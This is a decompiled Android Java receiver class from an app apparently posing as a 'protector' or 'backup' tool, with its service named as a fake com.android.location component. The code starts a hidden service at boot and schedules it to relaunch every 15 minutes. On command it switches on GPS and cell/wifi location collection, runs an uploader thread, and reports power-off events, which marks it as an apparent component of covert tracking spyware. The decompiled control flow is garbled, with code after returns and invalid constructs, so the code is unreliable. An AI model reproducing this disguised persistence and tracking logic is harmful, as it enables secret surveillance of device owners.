package ru.mobile.protector;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import com.android.location.PlayService;
import com.android.location.PlayService.Uploader;

public class StartupIntentReceiver
  extends BroadcastReceiver
{
  private static final String TAG = "backup.service";
  private PendingIntent alarmIntent;
  private AlarmManager alarmMgr;
  
  public StartupIntentReceiver() {}
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    do
    {
      int i;
      do
      {
        do
        {
          do
          {
            do
            {
              try
              {
                if (paramIntent.getAction().equals("android.intent.action.BOOT_COMPLETED")) {
                  paramContext.startService(new Intent(paramContext, PlayService.class));
                }
              }
              catch (Exception paramContext)
              {
                PlayService.EXCEPT(paramContext, "StartupIntentReceiver DIED");
                return;
              }
              try
              {
                Log.v("backup.service", "Setting alarm manager");
                this.alarmMgr = ((AlarmManager)paramContext.getSystemService("alarm"));
                Log.v("backup.service", "am=" + this.alarmMgr);
                paramIntent = new Intent(paramContext, PlayService.class);
                Log.v("backup.service", "ai=" + paramIntent);
                this.alarmIntent = PendingIntent.getBroadcast(paramContext, 0, paramIntent, 0);
                Log.v("backup.service", "pi=" + this.alarmIntent);
                this.alarmMgr.setInexactRepeating(2, 900000L, 900000L, this.alarmIntent);
                return;
              }
              catch (Exception paramContext) {}
              if (!paramIntent.getAction().equals("TURN_ON_GPS")) {
                break;
              }
              Log.v("backup.service", "Intent Receiver got GPS command start!");
            } while (PlayService.ref == null);
            PlayService.ref.wifiAndCellCollector.StartGPSCollect(false);
            return;
            if (!paramIntent.getAction().equals("android.intent.action.ACTION_SHUTDOWN")) {
              break;
            }
            Log.v("backup.service", "Intent Receiver got ACTION_SHUTDOWN!");
            PlayService.ChmodMeRun();
          } while (PlayService.ref == null);
          PlayService.ref.ReportPowerOff();
          return;
          if (!paramIntent.getAction().equals("android.intent.action.QUICKBOOT_POWEROFF")) {
            break;
          }
          Log.v("backup.service", "Intent Receiver got QUICKBOOT_POWEROFF");
        } while (PlayService.ref == null);
        PlayService.ref.ReportPowerOff();
        return;
        if (!paramIntent.getAction().equals("MyGoogleStartIntent")) {
          break;
        }
        int j = 0;
        i = j;
        if (PlayService.ref != null)
        {
          i = j;
          if (PlayService.ref.thUploader != null)
          {
            i = j;
            if (PlayService.ref.thUploader.isAlive())
            {
              Log.v("backup.service", "Already runnung!!");
              i = 1;
            }
          }
        }
      } while (i != 0);
      paramContext.startService(new Intent(paramContext, PlayService.class));
      Log.v("backup.service", "STARTING service...");
      return;
    } while (!paramIntent.getAction().equals("MyGoogleStopIntent"));
    paramIntent = new Intent(paramContext, PlayService.class);
    if (PlayService.ref != null)
    {
      PlayService.ref.Running = false;
      PlayService.ref.unregAll();
    }
    for (;;)
    {
      paramContext.stopService(paramIntent);
      return;
      Log.v("backup.service", "!!!!!!!PlayService.ref ^( is NULLLL!!!");
    }
  }
}
